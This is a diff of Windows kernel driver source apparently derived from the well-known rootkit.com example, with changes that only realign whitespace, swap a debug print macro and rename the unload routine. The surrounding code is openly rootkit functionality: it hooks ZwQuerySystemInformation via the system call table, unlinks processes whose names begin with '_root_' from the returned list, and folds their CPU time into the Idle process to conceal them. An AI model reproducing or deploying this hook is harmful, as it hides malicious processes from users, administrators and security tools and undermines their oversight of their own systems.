@@ -38,44 +38,44 @@ struct _SYSTEM_THREADS
 	LARGE_INTEGER           KernelTime;
 	LARGE_INTEGER           UserTime;
 	LARGE_INTEGER           CreateTime;
-	ULONG                           WaitTime;
-	PVOID                           StartAddress;
-	CLIENT_ID                       ClientIs;
-	KPRIORITY                       Priority;
-	KPRIORITY                       BasePriority;
-	ULONG                           ContextSwitchCount;
-	ULONG                           ThreadState;
+	ULONG                   WaitTime;
+	PVOID                   StartAddress;
+	CLIENT_ID               ClientIs;
+	KPRIORITY               Priority;
+	KPRIORITY               BasePriority;
+	ULONG                   ContextSwitchCount;
+	ULONG                   ThreadState;
 	KWAIT_REASON            WaitReason;
 };
 
 struct _SYSTEM_PROCESSES
 {
-	ULONG                           NextEntryDelta;
-	ULONG                           ThreadCount;
-	ULONG                           Reserved[6];
+	ULONG                   NextEntryDelta;
+	ULONG                   ThreadCount;
+	ULONG                   Reserved[6];
 	LARGE_INTEGER           CreateTime;
 	LARGE_INTEGER           UserTime;
 	LARGE_INTEGER           KernelTime;
 	UNICODE_STRING          ProcessName;
-	KPRIORITY                       BasePriority;
-	ULONG                           ProcessId;
-	ULONG                           InheritedFromProcessId;
-	ULONG                           HandleCount;
-	ULONG                           Reserved2[2];
-	VM_COUNTERS                     VmCounters;
-	IO_COUNTERS                     IoCounters; //windows 2000 only
-	struct _SYSTEM_THREADS          Threads[1];
+	KPRIORITY               BasePriority;
+	ULONG                   ProcessId;
+	ULONG                   InheritedFromProcessId;
+	ULONG                   HandleCount;
+	ULONG                   Reserved2[2];
+	VM_COUNTERS             VmCounters;
+	IO_COUNTERS             IoCounters; //windows 2000 only
+	struct _SYSTEM_THREADS  Threads[1];
 };
 
 // Added by Creative of rootkit.com
 struct _SYSTEM_PROCESSOR_TIMES
 {
-	LARGE_INTEGER					IdleTime;
-	LARGE_INTEGER					KernelTime;
-	LARGE_INTEGER					UserTime;
-	LARGE_INTEGER					DpcTime;
-	LARGE_INTEGER					InterruptTime;
-	ULONG							InterruptCount;
+	LARGE_INTEGER			IdleTime;
+	LARGE_INTEGER			KernelTime;
+	LARGE_INTEGER			UserTime;
+	LARGE_INTEGER			DpcTime;
+	LARGE_INTEGER			InterruptTime;
+	ULONG					InterruptCount;
 };
 
 
@@ -122,7 +122,6 @@ NTSTATUS NewZwQuerySystemInformation(
 		SystemInformation,
 		SystemInformationLength,
 		ReturnLength);
-
 	if (NT_SUCCESS(ntStatus))
 	{
 		// Asking for a file and directory listing
@@ -137,13 +136,13 @@ NTSTATUS NewZwQuerySystemInformation(
 
 			while (curr)
 			{
-				//DbgPrint("Current item is %x\n", curr);
+				KdPrint(("Current item is %x\n", curr));
 				if (curr->ProcessName.Buffer != NULL)
 				{
 					if (0 == memcmp(curr->ProcessName.Buffer, L"_root_", 12))
 					{
-						m_UserTime.QuadPart += curr->UserTime.QuadPart;
-						m_KernelTime.QuadPart += curr->KernelTime.QuadPart;
+						m_UserTime.QuadPart		+= curr->UserTime.QuadPart;
+						m_KernelTime.QuadPart	+= curr->KernelTime.QuadPart;
 
 						if (prev) // Middle or Last entry
 						{
@@ -168,8 +167,8 @@ NTSTATUS NewZwQuerySystemInformation(
 				{
 					// Add the kernel and user times of _root_* 
 					// processes to the Idle process.
-					curr->UserTime.QuadPart += m_UserTime.QuadPart;
-					curr->KernelTime.QuadPart += m_KernelTime.QuadPart;
+					curr->UserTime.QuadPart		+= m_UserTime.QuadPart;
+					curr->KernelTime.QuadPart	+= m_KernelTime.QuadPart;
 
 					// Reset the timers for next time we filter
 					m_UserTime.QuadPart = m_KernelTime.QuadPart = 0;
@@ -190,9 +189,9 @@ NTSTATUS NewZwQuerySystemInformation(
 }
 
 
-VOID OnUnload(IN PDRIVER_OBJECT DriverObject)
+VOID DriverUnload(IN PDRIVER_OBJECT DriverObject)
 {
-	DbgPrint("ROOTKIT: OnUnload called\n");
+	DbgPrint("ROOTKIT: DriverUnload called\n");
 
 	// unhook system calls
 	UNHOOK_SYSCALL(ZwQuerySystemInformation, OldZwQuerySystemInformation, NewZwQuerySystemInformation);
@@ -210,7 +209,7 @@ NTSTATUS DriverEntry(IN PDRIVER_OBJECT theDriverObject,
 					 IN PUNICODE_STRING theRegistryPath)
 {
 	// Register a dispatch function for Unload
-	theDriverObject->DriverUnload = OnUnload;
+	theDriverObject->DriverUnload = DriverUnload;
 
 	// Initialize global times to zero
 	// These variables will account for the 
